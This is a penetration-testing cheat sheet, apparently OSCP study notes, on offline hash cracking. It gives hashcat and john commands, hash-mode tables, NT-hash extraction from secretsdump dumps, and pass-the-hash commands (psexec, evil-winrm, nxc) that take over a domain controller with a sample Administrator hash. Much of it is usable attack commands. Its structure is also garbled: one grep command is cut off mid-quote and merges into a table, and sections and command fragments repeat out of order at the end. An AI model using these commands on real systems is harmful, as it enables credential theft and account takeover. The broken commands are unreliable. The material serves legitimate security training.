title: Hash Cracking — Offline
body: 5-step methodology: (1) Extract hash, (2) Identify type + format, (3) Estimate cracking time, (4) Prepare wordlist, (5) Attack. Wrong hash mode = wasted time. Always verify the format before running.
cmd:
# ══ ⭐ HAVE A HASH? START HERE ════════════════════════════════════════
# Match the prefix to the mode, then crack:
#   $krb5tgs$23$    Kerberoast RC4   -> -m 13100   (AES 17->19600  18->19700)
#   $krb5asrep$23$  AS-REP roast     -> -m 18200
#   aad3b435...:<32hex>  NTLM (SAM/NTDS)          -> -m 1000   (AD hashes: PASS, don't crack)
#   <user>::<dom>:...  Net-NTLMv2 (Responder)     -> -m 5600
#   $DCC2$...          MS Cache v2 (mscache)       -> -m 2100
#   $1$ md5crypt -m 500 | $6$ sha512 -m 1800 | $y$/$2b$ bcrypt -m 3200
#   keepass $keepass$ -m 13400 | ssh $sshng$ -m 22921 | zip -m 13600
# Crack (rockyou + best64 covers most OSCP wins):
hashcat -m <mode> hash.txt /usr/share/wordlists/rockyou.txt -r /usr/share/hashcat/rules/best64.rule
hashcat -m <mode> hash.txt --show      # print cracked
# Not sure of the type? -> STEP 1 identifies it.

# ── STEP 1: IDENTIFY HASH TYPE ───────────────────────
hash-identifier <hash>
hashid <hash>
# Online: https://hashes.com/en/tools/hash_identifier

# ── STEP 2: FORMAT FOR HASHCAT ────────────────────────
# Remove any "filename:" prefix added by *2john tools
# Extra spaces or newlines break cracking — copy carefully

# Transform file formats:
keepass2john Database.kdbx > keepass.hash   # remove "Database:" prefix
ssh2john id_rsa > ssh.hash                  # remove "id_rsa:" prefix
zip2john archive.zip > zip.hash
office2john doc.docx > doc.hash


# ── ⭐ SECRETSDUMP / NTDS OUTPUT — WHICH FIELD IS THE HASH? ─────
# secretsdump lines look like:   user:RID:LMhash:NThash:::
#   Administrator:500:aad3b435b51404eeaad3b435b51404ee:12579b1666d4ac10f0f59f300776495f:::
#                     └─ field 3: LM (ignore) ─┘ └─ field 4: NT ← THIS ONE ─┘
# You crack (or pass) the NT hash = FIELD 4. Never feed the whole line.
#
# Extract just the NT hashes (dedup):
cat dump.txt | grep ':::' | cut -d: -f4 | sort -u > nt.txt
#
# Keep user:hash pairs (nicer for tracking who cracked):
grep ':::' dump.txt | grep -v '\
# MD5              = -m 0
# SHA1             = -m 100
# SHA256           = -m 1400
# NTLM             = -m 1000
# NetNTLMv2        = -m 5600
# sha512crypt $6$  = -m 1800   (Linux /etc/shadow)
# bcrypt $2y$      = -m 3200
# Kerberoast       = -m 13100
# AS-REP           = -m 18200
# KeePass 2 (AES)  = -m 13400
# SSH key ($6$)    = -m 22921
# SSH key ($0$)    = -m 22911
# SSH key ($1/$3$) = -m 22931
# Find any mode:
hashcat --help | grep -i "keepass"
hashcat --help | grep -i "ssh"

# ── STEP 4: BENCHMARK — know your speed ──────────────
hashcat -b   # benchmark all modes on your hardware

# ── STEP 5: CRACK ─────────────────────────────────────
# Basic rockyou
hashcat -m <mode> hash.txt /usr/share/wordlists/rockyou.txt

# With rules — multiply coverage
hashcat -m <mode> hash.txt rockyou.txt \
  -r /usr/share/hashcat/rules/best64.rule
hashcat -m <mode> hash.txt rockyou.txt \
  -r /usr/share/hashcat/rules/rockyou-30000.rule   # best for rockyou
hashcat -m <mode> hash.txt rockyou.txt \
  -r /usr/share/hashcat/rules/d3ad0ne.rule         # broad mutations
hashcat -m <mode> hash.txt rockyou.txt \
  -r /usr/share/hashcat/rules/dive.rule            # deepest coverage

# KeePass — rockyou-30000.rule was made for this
hashcat -m 13400 keepass.hash rockyou.txt \
  -r /usr/share/hashcat/rules/rockyou-30000.rule --force

# SSH private key passphrase
hashcat -m 22921 ssh.hash rockyou.txt \
  -r /usr/share/hashcat/rules/best64.rule --force

# Show cracked result
hashcat -m <mode> hash.txt --show

# John fallback
john hash.txt --wordlist=/usr/share/wordlists/rockyou.txt
john hash.txt --format=NT --wordlist=rockyou.txt
john hash.txt --show | awk -F: '{print $1":"$4}' > user_nt.txt

#
# ⚠ "Token length exception" error = you fed hashcat the WRONG format:
#   - Whole secretsdump line (user:rid:lm:nt:::) → extract field 4 first
#   - user:hash format without --username → add the flag OR strip usernames
#   Crack JUST hashes (nt.txt, one hash per line):    hashcat -m 1000 nt.txt ...
#   Crack user:hash pairs (keep names):               hashcat -m 1000 user_hash.txt --username ...

# Crack them (NTLM = mode 1000):
hashcat -m 1000 nt.txt /usr/share/wordlists/rockyou.txt
hashcat -m 1000 nt.txt rockyou.txt -r /usr/share/hashcat/rules/best64.rule
#
# ⚠ AD NTLM HASHES RARELY CRACK — domain accounts use strong passwords.
#   rockyou will almost always EXHAUST with 0 real hits (the one that
#   "cracks" to blank is just the disabled Guest/empty-password account).
#   → Don't waste time cracking. PASS the hash instead (below).
#
# ⚡ DON'T CRACK IF YOU DON'T HAVE TO — PASS THE HASH:
# The Administrator NT hash (field 4 of the RID 500 line) is pass-the-hash ready.
# No cracking needed to own the DC:
#   nxc smb <DC-ip> -u Administrator -H 12579b1666d4ac10f0f59f300776495f
#   impacket-psexec Administrator@<DC-ip> -hashes :12579b1666d4ac10f0f59f300776495f
#   evil-winrm -i <DC-ip> -u Administrator -H 12579b1666d4ac10f0f59f300776495f
# The ':hash' syntax = empty LM : NT hash. That IS pass-the-hash. (see pth node)
#
# KRBTGT hash (RID 502) → golden ticket, not for cracking (see dcsync node).

# ── STEP 3: HASH MODULE REFERENCE ────────────────────
# MD5              = -m 0
# SHA1             = -m 100
# SHA256           = -m 1400
# NTLM             = -m 1000
# NetNTLMv2        = -m 5600
# sha512crypt $6$  = -m 1800   (Linux /etc/shadow)

hashcat --help | grep -i "keepass"
hashcat --help | grep -i "ssh"

# With rules — multiply coverage

  -r /usr/share/hashcat/rules/best64.rule
hashcat -m <mode> hash.txt rockyou.txt \

hashcat -m <mode> hash.txt rockyou.txt \
  -r /usr/share/hashcat/rules/d3ad0ne.rule         # broad mutations
hashcat -m <mode> hash.txt rockyou.txt \

warn: rockyou-30000.rule was built specifically for use with rockyou.txt — use it together. bcrypt and sha512crypt are intentionally slow — GPU gives minimal advantage. For those, a targeted wordlist + rules beats a massive wordlist every time.
